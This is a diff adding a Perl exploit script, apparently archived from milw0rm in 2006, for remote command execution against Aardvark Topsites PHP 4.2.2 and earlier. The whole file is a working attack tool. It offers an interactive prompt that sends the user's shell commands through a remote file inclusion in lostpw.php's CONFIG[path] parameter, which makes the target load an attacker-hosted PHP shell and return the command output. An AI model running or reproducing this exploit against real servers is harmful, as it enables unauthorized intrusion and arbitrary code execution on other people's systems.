@@ -1,0 +1,94 @@
+#!/usr/bin/perl
+#
+# Aardvark Topsites PHP <=4.2.2 Remote Command Execution Exploit
+#
+# Copyright (c) 2006 cijfer <cijfer@netti!fi>
+# All rights reserved.
+#
+# never ctrl+c again.
+# cijfer$ http://target.com/dir
+# host changed to 'http://target.com/dir'
+# cijfer$ 
+#
+# to set your PHP shell location:
+# cijfer$ shell=http://my.shell.fi/phpshell.gif?&cmd=
+# php shell set to 'http://my.shell.fi/phpshell.gif?&cmd='
+# cijfer$
+#
+# $Id: cijfer-atpxpl.pl,v 0.1 2006/04/30 02:11:00 cijfer Exp $
+
+use strict;
+use LWP::UserAgent;
+use URI::Escape;
+use Getopt::Long;
+use Term::ANSIColor;
+
+my($command,$verbose,$proxy,$shell,$host,$res);
+
+$res = GetOptions("host=s" => \$host, "proxy=s" => \$proxy, "verbose+" => \$verbose);
+&usage unless $host;
+
+while()
+{
+	print color("green"), "cijfer\# ", color("reset");
+	chomp($command = <STDIN>);
+	exit unless $command;
+	if($command =~ m/^http:\/\/(.*)/g)
+	{
+		$host="http://".$1;
+		print "host changed to '";
+		print color("bold"), $host."'\n", color("reset");
+	}
+	elsif($command =~ m/^shell=http:\/\/(.*)/g)
+	{
+		$shell="http://".$1;
+		print "php shell set to '";
+		print color("bold"), $shell."'\n", color("reset");
+	}
+	else
+	{
+		&exploit($command,$host);
+	}
+}
+
+sub usage
+{
+	print "Aardvark Topsites PHP <=4.2.2 Remote Command Execution Exploit\n";
+	print "usage: $0 -hpv\n\n";
+	print "  -h, --host\t\tfull address of target (ex. http://www.website.com/directory)\n";
+	print "  -p, --proxy\t\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n";
+	print "  -v, --verbose\t\tverbose mode (debug)\n\n";
+	exit;
+}
+
+sub exploit
+{
+	my($command,$host) = @_;
+	my($string,$execut,$recv,$sent,$out,$cij,@cij);
+
+	$cij=LWP::UserAgent->new() or die;
+	$cij->agent("Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101");
+	$cij->proxy("http", "http://".$proxy."/") unless !$proxy;
+
+	$string  = "%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B%20";
+	$string .= uri_escape(shift);
+	$string .= "%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F";
+
+	$out=$cij->get($host."/sources/lostpw.php?FORM[set]=1&FORM[session_id]=1&CONFIG[path]=".$shell.$string);
+
+	if($out->is_success)
+	{
+		@cij=split("_cijfer_",$out->content);
+		print substr(@cij[1],1);
+	}
+
+	if($verbose)
+	{
+		$recv=length $out->content;
+		print "Total received bytes: ".$recv."\n";
+		$sent=length $command;
+		print "Total sent bytes: ".$sent."\n";
+	}
+}
+
+# milw0rm.com [2006-04-30]
